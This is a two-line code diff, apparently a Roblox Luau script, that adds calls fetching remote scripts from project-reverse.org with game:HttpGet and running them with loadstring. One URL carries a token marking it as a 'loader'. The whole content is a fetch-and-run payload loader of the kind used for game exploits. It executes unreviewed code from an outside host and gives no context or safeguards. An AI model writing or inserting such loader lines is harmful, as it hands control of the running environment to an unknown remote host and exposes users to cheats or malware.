@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_main.luau"))();
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjBjNGI4YmI3LWQyNDgtNDc2Yy04MjdmLTc0OGQzMTg0MDg1YiIsImtpbmQiOiJsb2FkZXIifQ"))()
